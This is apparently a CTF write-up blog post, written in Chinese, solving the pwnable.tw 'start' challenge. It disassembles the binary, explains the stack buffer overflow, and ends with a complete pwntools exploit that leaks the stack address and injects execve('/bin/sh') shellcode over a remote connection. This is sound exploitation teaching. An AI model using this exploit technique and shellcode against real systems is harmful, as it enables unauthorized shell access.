---
title: pwnable.tw-start.md
date: 2026-06-26
tags: ["pwn", "pwnable.tw"]
description: ""
---
# Description

> Just a start.

## Recon
```sh
penguin@penguin ~/p/start> file start 
start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

```sh
penguin@penguin ~/p/start> checksec --file=start
[*] '/home/penguin/pwnable.tw/start/start'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX disabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```
基本的 Recon 後發現他是 x86 的 binaray，保護機制都沒開

這題一開始老樣子用 IDA F5 後發現沒有 main，所以有可能是手刻組語orz

## Solution
既然沒有 main 那只好 disasamble

```sh
pwndbg> info function
All defined functions:

Non-debugging symbols:
0x08048060  _start
0x0804809d  _exit
0x080490a3  __bss_start
0x080490a3  _edata
0x080490a4  _end
```

```sh
pwndbg> disas _start
Dump of assembler code for function _start:
   0x08048060 <+0>:	push   esp
   0x08048061 <+1>:	push   0x804809d
   0x08048066 <+6>:	xor    eax,eax
   0x08048068 <+8>:	xor    ebx,ebx
   0x0804806a <+10>:	xor    ecx,ecx
   0x0804806c <+12>:	xor    edx,edx
   0x0804806e <+14>:	push   0x3a465443
   0x08048073 <+19>:	push   0x20656874
   0x08048078 <+24>:	push   0x20747261
   0x0804807d <+29>:	push   0x74732073
   0x08048082 <+34>:	push   0x2774654c
   0x08048087 <+39>:	mov    ecx,esp
   0x08048089 <+41>:	mov    dl,0x14
   0x0804808b <+43>:	mov    bl,0x1
   0x0804808d <+45>:	mov    al,0x4
   0x0804808f <+47>:	int    0x80
   0x08048091 <+49>:	xor    ebx,ebx
   0x08048093 <+51>:	mov    dl,0x3c
   0x08048095 <+53>:	mov    al,0x3
   0x08048097 <+55>:	int    0x80
   0x08048099 <+57>:	add    esp,0x14
   0x0804809c <+60>:	ret
End of assembler dump.
```

雖然看到組語都反射性想迴避，但還是硬著頭皮(?仔細去分析

基本上翻成 C 語言就是
```c
write(1, "Let's start the CTF:", 20);
read(0, stack_buffer, 60);
return;
```

接下來再一個一個拆解

### ret addr
```sh
   0x08048060 <+0>:	push   esp
   0x08048061 <+1>:	push   0x804809d
```

這段先把 esp 的值壓到 stack，再把 `0x08048061` 壓到 stack 上

正常情況如果沒有被 overflow，`0x08048061` 就會是 ret addr

### clear registers
```sh
0x08048066 <+6>:	xor    eax,eax
0x08048068 <+8>:	xor    ebx,ebx
0x0804806a <+10>:	xor    ecx,ecx
0x0804806c <+12>:	xor    edx,edx
```
翻成白話版本就是清空 `eax`、`ebx`、`ecx`、`edx`

eax -> syscall number
ebx -> 第一個參數
ecx -> 第二個參數
edx -> 第三個參數

所以這裡就是對 syscall 做預處理

### put string to stack
```sh
0x0804806e <+14>:	push   0x3a465443
0x08048073 <+19>:	push   0x20656874
0x08048078 <+24>:	push   0x20747261
0x0804807d <+29>:	push   0x74732073
0x08048082 <+34>:	push   0x2774654c
```
因為是 little endian，所以要倒過來看

```sh
0x2774654c -> 4c 65 74 27 -> "Let'"
0x74732073 -> 73 20 73 74 -> "s st"
0x20747261 -> 61 72 74 20 -> "art "
0x20656874 -> 74 68 65 20 -> "the "
0x3a465443 -> 43 54 46 3a -> "CTF:"
```
合起來就是 -> `Let's start the CTF:`

### print string
```sh
0x08048087 <+39>:	mov    ecx,esp
0x08048089 <+41>:	mov    dl,0x14
0x0804808b <+43>:	mov    bl,0x1
0x0804808d <+45>:	mov    al,0x4
0x0804808f <+47>:	int    0x80
```
<div class="info-box">
<strong>
這邊用 `eax` 來說明 `al、`dl`、`bl`

```sh
eax = 32-bit register
ax  = lower 16 bits of eax
al  = lower 8 bits of eax
ah  = higher 8 bits of ax
```

所以
```sh
ebx -> bx -> bl
edx -> dx -> dl
```
</strong>
</div>


在 x86 int 80 中 syscall 規則是
| Register     | 意義             | 這裡的值              |
| ------------ | -------------- | ----------------- |
| `eax` / `al` | syscall number | `4` = `write`     |
| `ebx` / `bl` | 第 1 個參數        | `1` = stdout      |
| `ecx`        | 第 2 個參數        | buffer address    |
| `edx` / `dl` | 第 3 個參數        | `0x14` = 20 bytes |

整體翻譯一下就是 
```c
write(1, esp, 0x14);
```

等同於
```c
write(stdout, "Let's start the CTF:", 20);
```

### call read func
```sh
0x08048091 <+49>:	xor    ebx,ebx
0x08048093 <+51>:	mov    dl,0x3c
0x08048095 <+53>:	mov    al,0x3
0x08048097 <+55>:	int    0x80
```

邏輯同上，翻成 C 語言會是
```c
read(0, ecx, 0x3c);
```
等於
```c
read(stdin, stack_buffer, 60);
```

這邊就有很明顯的 BOF，原本的 stack 我們只放 20 bytes，但現在讀了 60 bytes

先來看 stack 的結構，大致如下
```txt
高位址
[ saved esp         ]
[ 0x0804809d           ]  return address
[ "Let's start the CTF:" ]  20 bytes
低位址
```

所以構造 exploit 第一步的 payload =

 `b"A" * 20 + p32(new_return_address)`

### what is the new return address?

1. 因為 NX 沒開，所以我們可以直接寫 shellcode 到 stack 上，但因為我們 stack 的實際位址不固定，所以要先 leak stack address

2. 程式一開始有 `push esp`，代表他把 stack pointer 存到 stack 上

3. 如果我們讓 ret 的 addr 跳到 `0x08048087`，也就是 write 的開頭，就可以印出 stack 的資料。所以 ret addr 就是 `0x08048087`

4. 接著因為這是 32-bit binary，所以前 4 bytes 就是 stack addr

### get shell

最後就是要開 shell

1. 不過 `execve("/bin/sh")` 有 23 bytes，而 buffer 只有 20 bytes，所以這邊要利用 `read()` 把 shellcode 放到 stack 上

2. 因此第二個 payload 會是 `(padding) + (stack_addr) + shellcode`

## Exploit

```python
from pwn import *

p = remote("chall.pwnable.tw", 10000)

write_gadget = 0x08048087
offset = 20

# receive prompt
p.recvuntil(b"CTF:")

# stage 1: leak stack address
payload1 = b"A" * offset
payload1 += p32(write_gadget)

p.send(payload1)

# leaked data: first 4 bytes should be saved esp
leak = p.recv(20)
stack_addr = u32(leak[:4])

log.success(f"leaked stack address: {hex(stack_addr)}")

# execve("/bin/sh", NULL, NULL)
shellcode = asm("""
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 0xb
    int 0x80
""")

# stage 2: jump to shellcode
payload2 = b"B" * offset
payload2 += p32(stack_addr + 20)
payload2 += shellcode

p.send(payload2)

p.interactive()
```


